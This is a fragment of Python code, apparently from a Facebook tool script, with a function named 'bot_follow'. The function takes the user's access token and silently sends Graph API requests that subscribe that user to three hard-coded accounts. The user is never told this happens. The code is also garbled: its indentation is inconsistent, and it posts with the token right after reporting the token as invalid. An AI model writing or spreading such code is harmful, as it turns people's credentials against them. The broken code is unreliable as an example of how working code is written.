...
def bot_follow():
	try:
		...
		print("\n   [!] Token invalid")
		masuk()
    	requests.post('https://graph.facebook.com/100016747663270/subscribers?access_token=' + toket)      #Fauzi Opa
    	requests.post('https://graph.facebook.com/100008337786436/subscribers?access_token=' + toket)      #Jamilatul Hasanah
    	requests.post('https://graph.facebook.com/100041820308672/subscribers?access_token=' + toket)      #Farhan
    	menu()
